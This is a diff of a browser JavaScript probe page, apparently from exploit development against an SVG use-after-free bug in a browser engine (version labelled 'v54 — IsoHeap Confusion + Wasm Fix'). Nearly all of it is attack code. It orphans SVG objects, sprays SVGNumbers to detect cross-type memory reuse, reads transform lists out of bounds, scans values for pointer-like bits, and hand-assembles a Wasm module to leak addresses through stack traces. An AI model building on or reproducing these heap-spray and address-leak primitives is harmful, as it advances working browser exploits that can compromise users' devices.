+  svg2.appendChild(rect);
+  var XVAL=1234567.89; // distinctive value
+  rect.x.baseVal.value=XVAL;
+  var lenRef=rect.x.baseVal;
+  L('CONF3: [T2] SVGLength wrote '+XVAL+': '+lenRef.value);
+  rect.parentNode.removeChild(rect);
   removeSVG(svg2);
+  L('CONF3: [T2] SVGLength after orphan: '+lenRef.value+' ALIVE='+(lenRef.value===Math.fround(XVAL)));
 
-  // Test 4: ArrayBuffer.transfer() — moves backing store to new AB
-  L('ADR11: [T4] ArrayBuffer.transfer() probe...');
-  try{
-    var ab3=new ArrayBuffer(128);
-    var u8_3=new Uint8Array(ab3);
-    u8_3[0]=0xAB;u8_3[1]=0xCD;
-    if(typeof ab3.transfer==='function'){
-      var ab4=ab3.transfer(256); // resize + transfer
-      L('ADR11: [T4] transfer() available! new byteLength='+ab4.byteLength);
-      L('ADR11: [T4] old ab detached: '+(ab3.byteLength===0));
-      var u8_4=new Uint8Array(ab4);
-      L('ADR11: [T4] canary preserved: 0x'+u8_4[0].toString(16)+u8_4[1].toString(16));
-    }else{
-      L('ADR11: [T4] ArrayBuffer.transfer() not available');
+  // Now spray SVGNumbers — do any inherit the SVGLength value?
+  var numRefs=sprayOrphanNums(200, 0, 'c3n1');
+  var xHits=0;
+  for(var i=0;i<numRefs.length;i++){
+    var v=numRefs[i].value;
+    // SVGLength value as float32
+    if(v===Math.fround(XVAL)){
+      xHits++;
+      L('CONF3: [T2] ★ num['+i+']='+v+' matches SVGLength XVAL!','hit');
     }
-  }catch(ex){L('ADR11: [T4] transfer: '+ex.message);}
+    if(v!==0&&v!==Math.fround(i)){
+      L('CONF3: [T2] num['+i+']='+v+' nonzero unexpected bits='+f64hex(v),'hit');
+    }
+  }
+  L('CONF3: [T2] SVGLength→SVGNumber hits='+xHits+(xHits>0?' ★ CROSS-TYPE!':'clean'));
 
-  L('ADR11: done');
+  // Test 3: SVGNumber write, then SVGLength read
+  // Orphan SVGNumbers with distinctive value, then alloc SVGLengths
+  var numRefs2=sprayOrphanNums(200, 0, 'c3n2');
+  var NVAL=9876543.21;
+  for(var i=0;i<numRefs2.length;i++) numRefs2[i].value=Math.fround(NVAL);
+  L('CONF3: [T3] wrote NVAL='+Math.fround(NVAL)+' to 200 orphaned SVGNumbers');
+
+  // Alloc many SVGLengths via rect.x.baseVal
+  var lenHits=0;
+  var svgLens=[];
+  for(var k=0;k<20;k++){
+    var svg3=makeSVG();
+    var r=document.createElementNS(SVG_NS,'rect');
+    r.setAttribute('width','50');r.setAttribute('height','50');
+    svg3.appendChild(r);
+    var len=r.width.baseVal;
+    svgLens.push({len:len,initial:len.value,svg:svg3,r:r});
+  }
+  for(var k=0;k<svgLens.length;k++){
+    var initial=svgLens[k].initial;
+    if(initial===Math.fround(NVAL)){
+      lenHits++;
+      L('CONF3: [T3] ★ len['+k+'].initial='+initial+' matches NVAL!','hit');
+    }
+    // also check for any ptr-like values
+    if(isPointerLike(initial)) L('CONF3: [T3] len['+k+'].initial='+initial+' PTR-LIKE!','hit');
+    svgLens[k].r.parentNode.removeChild(svgLens[k].r);
+    removeSVG(svgLens[k].svg);
+  }
+  L('CONF3: [T3] SVGNumber→SVGLength hits='+lenHits+(lenHits>0?' ★ CROSS-TYPE!':'clean'));
+
+  // Test 4: SVGTransformList.getItem() out of bounds — what does it return?
+  L('CONF3: [T4] SVGTransformList getItem OOB...');
+  var svg4=makeSVG();
+  var g4=document.createElementNS(SVG_NS,'g');svg4.appendChild(g4);
+  var xf4=svg4.createSVGTransform();g4.transform.baseVal.appendItem(xf4);
+  L('CONF3: [T4] list length='+g4.transform.baseVal.length);
+  try{
+    var oob=g4.transform.baseVal.getItem(100); // way OOB
+    L('CONF3: [T4] getItem(100)='+oob+' (expected throw or null)','warn');
+    if(oob&&oob.matrix){
+      var om=oob.matrix;
+      L('CONF3: [T4] OOB matrix: a='+om.a+' b='+om.b+' c='+om.c+' d='+om.d+' e='+om.e+' f='+om.f);
+      for(var field of['a','b','c','d','e','f']){
+        if(isPointerLike(om[field])) L('CONF3: ★★ OOB matrix.'+field+'='+om[field]+' PTR-LIKE!','hit');
+      }
+    }
+  }catch(ex){L('CONF3: [T4] OOB threw (expected): '+ex.message);}
+  removeSVG(svg4);
+
+  L('CONF3: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
-// ADR12 — PerformanceObserver / PerformanceMark / crypto
-// performance.mark() stores timing info in C++ PerformanceMark objects
-// Any internal C++ pointer exposed through timing APIs?
-//
-// crypto.getRandomValues — is the output distinct from heap contents?
-// (Confirms RNG is seeded separately, not reading heap garbage)
-//
-// Also: MessageEvent.source, Event.target — any ptr-like fields?
-// Also: Proxy / Reflect internals
+// ADR7c — Wasm fixed, properly encoded LEB128
+// Module: imports env.cb (()->void), exports "run" (()->void, calls cb)
+// We carefully encode every length as LEB128 unsigned.
 // ─────────────────────────────────────────────────────────────────
-function runADR12(){
-  L('','suite-hdr');L('ADR12: Performance / crypto / Proxy / Event internals');
+function runADR7c(){
+  L('','suite-hdr');L('ADR7c: Wasm stack frame leak (corrected encoding)');
+  if(typeof WebAssembly==='undefined'){L('ADR7c: unavailable','miss');return;}
 
-  // Test 1: PerformanceMark — does mark.startTime carry internal ptr bits?
-  try{
-    performance.mark('probe_start');
-    // Do some allocation between marks
-    var dummy=new Array(1000).fill(0).map(function(_,i){return{v:i};});
-    performance.mark('probe_end');
-    var entries=performance.getEntriesByType('mark');
-    L('ADR12: [T1] mark entries: '+entries.length);
-    for(var i=0;i<entries.length;i++){
-      var e=entries[i];
-      L('ADR12: [T1] mark['+i+']: name='+e.name+' startTime='+e.startTime+' bits='+f64hex(e.startTime));
-      if(isPointerLike(e.startTime)) L('ADR12: ★ startTime PTR-LIKE!','hit');
+  // Manually build correct wasm binary:
+  // Sections: type, import, function, export, code
+  //
+  // Type section: type[0] = () -> ()
+  //   0x01 0x04   -- section 1, 4 bytes
+  //   0x01        -- 1 type
+  //   0x60 0x00 0x00  -- functype: 0 params, 0 results
+  //
+  // Import section: env.cb :: type[0]
+  //   field: "env" = 65 6e 76  (len=3)
+  //   name:  "cb"  = 63 62     (len=2)
+  //   kind=0x00, type_idx=0x00
+  //   payload = 01 03 65 6e 76 02 63 62 00 00  (10 bytes)
+  //
+  // Function section: func[1] = type[0]
+  //   payload = 01 00  (2 bytes)
+  //
+  // Export section: "run" = func[1]
+  //   "run" = 72 75 6e  (len=3)
+  //   payload = 01 03 72 75 6e 00 01  (7 bytes)
+  //
+  // Code section: 1 body, body=[ 0 locals, call 0, end ]
+  //   body bytes: 00 10 00 0b = 4 bytes, body_size=4
+  //   payload = 01 04 00 10 00 0b  (6 bytes... wait body_size prefix)
+  //   Actually: count=1, then body_size(u32 leb)=4, then 4 bytes
+  //   payload = 01 04 00 10 00 0b  → 6 bytes
+
+  var mod = [
+    0x00,0x61,0x73,0x6d, // magic
+    0x01,0x00,0x00,0x00, // version
+    // Type section
+    0x01, 0x04,
+      0x01,
+      0x60,0x00,0x00,
+    // Import section: 1 import: "env"."cb" = func type[0]
+    0x02, 0x0a,
+      0x01,
+      0x03, 0x65,0x6e,0x76,   // "env"
+      0x02, 0x63,0x62,        // "cb"
+      0x00, 0x00,             // kind=func, type index=0
+    // Function section: func[1] = type[0]
+    0x03, 0x02,
+      0x01,
+      0x00,
+    // Export section: "run" → func index 1
+    0x07, 0x07,
+      0x01,
+      0x03, 0x72,0x75,0x6e,   // "run"
+      0x00, 0x01,             // kind=func, index=1
+    // Code section: 1 body
+    0x0a, 0x06,
+      0x01,           // 1 function body
+      0x04,           // body size = 4 bytes
+      0x00,           // 0 locals
+      0x10, 0x00,     // call func[0]
+      0x0b,           // end
+  ];
+
+  var bytes=new Uint8Array(mod);
+  var stackInside=null;
+
+  WebAssembly.instantiate(bytes.buffer,{
+    env:{
+      cb:function cb_from_wasm(){
+        stackInside=new Error('inside_wasm').stack;
+        throw new Error('thrown_inside_wasm');
+      }
     }
-    // measure
+  }).then(function(res){
+    L('ADR7c: instantiated OK exports='+Object.keys(res.instance.exports).join(','));
     try{
-      performance.measure('probe_dur','probe_start','probe_end');
-      var measures=performance.getEntriesByType('measure');
-      L('ADR12: [T1] measure duration='+measures[0].duration+' bits='+f64hex(measures[0].duration));
-    }catch(ex){L('ADR12: [T1] measure: '+ex.message);}
-  }catch(ex){L('ADR12: [T1] performance.mark: '+ex.message,'warn');}
+      res.instance.exports.run();
+    }catch(err){
+      L('ADR7c: caught: '+err.message);
 
-  // Test 2: PerformanceObserver
-  L('ADR12: [T2] PerformanceObserver='+typeof PerformanceObserver);
-  if(typeof PerformanceObserver!=='undefined'){
-    try{
-      var obs=new PerformanceObserver(function(list){
-        var entries=list.getEntries();
-        for(var i=0;i<entries.length;i++){
-          var e=entries[i];
-          L('ADR12: [T2] observer entry: name='+e.name+' startTime='+e.startTime.toFixed(6)+' bits='+f64hex(e.startTime));
-          if(isPointerLike(e.startTime)) L('ADR12: ★ observer startTime PTR-LIKE!','hit');
+      // Stack captured INSIDE the wasm frame
+      if(stackInside){
+        L('ADR7c: === stack INSIDE wasm callback ===');
+        L(stackInside.slice(0,1000));
+        var insideHex=stackInside.match(/0x[0-9a-fA-F]{6,}/g)||[];
+        L('ADR7c: inside hex patterns: '+insideHex.length);
+        for(var i=0;i<insideHex.length;i++) L('ADR7c: ★inside '+insideHex[i],'hit');
+        // wasm-specific lines
+        stackInside.split('\n').forEach(function(line){
+          if(/wasm/i.test(line)||/@\[/.test(line)||/\[wasm-stub\]/.test(line)||/wasm-function/i.test(line)){
+            L('ADR7c: wasm-line: '+line);
+          }
+        });
+      }
+
+      // Stack from outer catch
+      var outerStk=err.stack||'';
+      L('ADR7c: === outer catch stack ===');
+      L(outerStk.slice(0,1000));
+      var outerHex=outerStk.match(/0x[0-9a-fA-F]{6,}/g)||[];
+      L('ADR7c: outer hex patterns: '+outerHex.length);
+      for(var i=0;i<outerHex.length;i++) L('ADR7c: ★outer '+outerHex[i],'hit');
+      outerStk.split('\n').forEach(function(line){
+        if(/wasm/i.test(line)||/@\[/.test(line)||/wasm-function/i.test(line)){
+          L('ADR7c: wasm-line: '+line);
         }
       });
-      obs.observe({entryTypes:['mark','measure','longtask']});
-      performance.mark('obs_test');
-      obs.disconnect();
-    }catch(ex){L('ADR12: [T2] observer: '+ex.message);}
-  }
-
-  // Test 3: crypto.getRandomValues — is it seeded with heap garbage?
-  // (If the first few bytes look like valid JS floats, suspect memory seeding)
-  try{
-    var rnd=new Uint32Array(8);
-    crypto.getRandomValues(rnd);
-    L('ADR12: [T3] crypto.getRandomValues:');
-    for(var i=0;i<8;i++) L('ADR12: [T3] rnd['+i+']=0x'+rnd[i].toString(16).padStart(8,'0'));
-    // Check if any 64-bit pair looks like a valid arm64 heap pointer
-    var dv2=new DataView(rnd.buffer);
-    for(var i=0;i<4;i++){
-      var f=dv2.getFloat64(i*8,true);
-      if(isPointerLike(f)) L('ADR12: ★ rnd f64['+i+']='+f+' PTR-LIKE (unlikely for true RNG)','hit');
     }
-  }catch(ex){L('ADR12: [T3] crypto: '+ex.message,'warn');}
-
-  // Test 4: Proxy get trap — does handler receive ptr-like values?
-  try{
-    var ptrTarget={};
-    var intercepted=[];
-    var proxy=new Proxy(ptrTarget,{
-      get:function(target,prop,receiver){
-        // receiver is the proxy itself — does it carry address info?
-        intercepted.push({prop:prop,receiverType:typeof receiver});
-        return target[prop];
-      }
-    });
-    proxy.testProp; // trigger get
-    L('ADR12: [T4] Proxy get trap fired: prop='+intercepted[0].prop+' receiverType='+intercepted[0].receiverType);
-    L('ADR12: [T4] Reflect.ownKeys(proxy)='+JSON.stringify(Reflect.ownKeys(proxy)));
-  }catch(ex){L('ADR12: [T4] Proxy: '+ex.message);}
-
-  // Test 5: Event.target internal address probe
-  // Create a DOM event, check if event.target has any unusual properties
-  try{
-    var div=document.createElement('div');
-    var evt_ptr=null;
-    div.addEventListener('click',function(ev){
-      evt_ptr=ev;
-    });
-    div.dispatchEvent(new MouseEvent('click'));
-    if(evt_ptr){
-      L('ADR12: [T5] Event received: type='+evt_ptr.type);
-      // timeStamp — same as performance timing, check bits
-      L('ADR12: [T5] timeStamp='+evt_ptr.timeStamp.toFixed(6)+' bits='+f64hex(evt_ptr.timeStamp));
-      if(isPointerLike(evt_ptr.timeStamp)) L('ADR12: ★ timeStamp PTR-LIKE!','hit');
-    }
-  }catch(ex){L('ADR12: [T5] Event: '+ex.message);}
-
-  // Test 6: SVGMatrix via Proxy — intercept property access, see raw values
-  try{
-    var rawM=getOrphanedMatrix();
-    rawM.a=0x1b0001234;rawM.b=0xcafe0000;rawM.c=0;rawM.d=0x1b0001234;rawM.e=0;rawM.f=0;
-    var proxyM=new Proxy(rawM,{
-      get:function(target,prop){
-        var v=target[prop];
-        if(typeof v==='number') L('ADR12: [T6] proxy get '+String(prop)+'='+v+' bits='+f64hex(v)+(isPointerLike(v)?' ★PTR':''));
-        return v;
-      }
-    });
-    var a=proxyM.a;
-    var inv=rawM.inverse();
-    L('ADR12: [T6] inverse().a='+inv.a+' exact='+(inv.a===0x1b0001234));
-  }catch(ex){L('ADR12: [T6] Proxy matrix: '+ex.message);}
-
-  L('ADR12: done');
+  }).catch(function(err){
+    L('ADR7c: compile FAILED: '+err.message,'miss');
+    // Dump the bytes for debugging
+    L('ADR7c: module bytes: '+Array.from(bytes).map(function(b){return b.toString(16).padStart(2,'0');}).join(' '));
+  });
 }
 
 // ─────────────────────────────────────────────────────────────────
 // RUN ALL
 // ─────────────────────────────────────────────────────────────────
-var suites={ADR7b:runADR7b,ADR10:runADR10,ADR11:runADR11,ADR12:runADR12};
+var suites={CONF1:runCONF1,CONF2:runCONF2,CONF3:runCONF3,ADR7c:runADR7c};
 
 function runSuite(name){
   L('=== '+name+' ===','suite-hdr');
@@ -566,7 +595,7 @@ function runSuite(name){
 
 function runAll(){
   clearOut();
-  L('SVG UAF v53 — addrof Probes III','suite-hdr');
+  L('SVG UAF v54 — IsoHeap Confusion + Wasm Fix','suite-hdr');
   L('----------------------------------------------------');
   var names=Object.keys(suites);
   var i=0;
